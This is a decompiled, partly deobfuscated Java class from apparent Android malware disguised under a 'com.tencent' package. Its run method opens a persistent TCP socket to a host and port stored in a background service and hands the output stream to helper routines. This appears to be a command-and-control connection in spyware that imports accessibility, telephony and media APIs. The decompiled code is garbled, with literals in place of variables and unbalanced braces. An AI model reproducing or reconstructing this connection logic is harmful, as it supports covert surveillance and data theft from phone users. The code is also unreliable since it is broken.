package com.tencent;

import android.content.*;
import android.view.*;
import android.widget.*;
import android.app.*;
import android.os.*;
import android.accessibilityservice.*;
import android.view.accessibility.*;
import android.telephony.*;
import android.media.*;
import java.util.*;
import java.io.*;
import java.net.*;

/**
 * Deobfuscated class: SmsSenderEngine_2
 * Original: Lcom/tencent/skatinghsatinbintegralj9$2;
 */
class SmsSenderEngine_2 implements Runnable; {

    // === FIELDS ===
    final SmsSenderEngine this$0;

    // === METHODS ===

     void Constructor(SmsSenderEngine param0) {
        v0.this$0 = v1;
        // new Object()
        return;
    }

    public void run() {
        v0 = 0;
        v1 = 0;
        v2 = 3;
        if (v1 < 3) { // goto +5
        SmsSenderEngine.stopCapture();
        v3 = MainBackgroundService.tunesxconcerningn1011_Host;
        v4 = DataPackagingEngine.grhcriticismzfailedd31(v3);
        v4 = InetAddress.getByName(v3);
        v4 = MainBackgroundService.tunesxconcerningn1011_Port;
        DataPackagingEngine.grhcriticismzfailedd31(v4);
        v3 = Integer.parseInt(v4);
        // new InetSocketAddress(v3, v4)
        v3 = new Socket();
        // new Socket()
        SmsSenderEngine.sk = v3;
        v3 = SmsSenderEngine.sk;
        v3.setSoTimeout(0);
        v3 = SmsSenderEngine.sk;
        v4 = 1;
        v3.setKeepAlive(1);
        v3 = SmsSenderEngine.sk;
        v3.setTcpNoDelay(1);
        v3 = SmsSenderEngine.sk;
        v5 = 60000;
        v3.connect(3, 60000);
        3.isConnected();
        SmsSenderEngine.ctd = 3;
        if (3 != 1) { // goto +36
        3.getOutputStream();
        SmsSenderEngine.out = 3;
        SmsSenderEngine.Lo = 1;
        SmsSenderEngine.access$000(3);
        SmsSenderEngine.ISON = 1;
        3.pr();
        // goto (branch)
        SmsSenderEngine.di();
        // goto (branch)
        SmsSenderEngine.di();
        // goto (branch)
        SmsSenderEngine.di();
        v2 = 1;
        Thread.sleep(1, v3);
        v1 = v1 + 1;
        if (1 == null || 1 == 0) { // goto +-117
        return;
    }
}
